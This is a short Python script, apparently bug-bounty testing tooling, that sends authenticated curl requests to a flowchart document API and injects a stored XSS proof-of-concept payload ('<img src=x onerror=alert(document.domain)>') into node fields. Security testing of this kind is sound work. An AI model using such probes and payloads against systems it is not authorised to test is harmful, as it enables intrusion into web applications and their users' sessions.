import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_SYSADMIN').read().strip()
def req(m,p,body=None,tok=None):
    cmd=['curl','-s','-m','60','-o','/tmp/b','-w','%{http_code}','-X',m,H+p,
         '-H','token: '+(tok or TOK),'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='ZXF'+uuid.uuid4().hex[:5]
print("=== POST /documents/flowchart — shape probe ===")
for body in [{}, {"nodes":[]}, {"nodes":[{"id":"1","label":f"ZX{tag}"}]}]:
    c,b=req('POST','/api/v1/documents/flowchart',body)
    print(f"  {json.dumps(body)[:60]:62} -> {c} {b[:160].replace(chr(10),' ')}")
print()
print("=== with a payload in the node label ===")
pay=f'<img src=x onerror=alert(document.domain)>{tag}'
for body in [{"nodes":[{"id":"1","label":pay}]},
             {"nodes":[{"id":"1","text":pay}]},
             {"nodes":[{"label":pay}]}]:
    c,b=req('POST','/api/v1/documents/flowchart',body)
    print(f"  keys={list(body['nodes'][0].keys())} -> {c} {b[:200].replace(chr(10),' ')}")
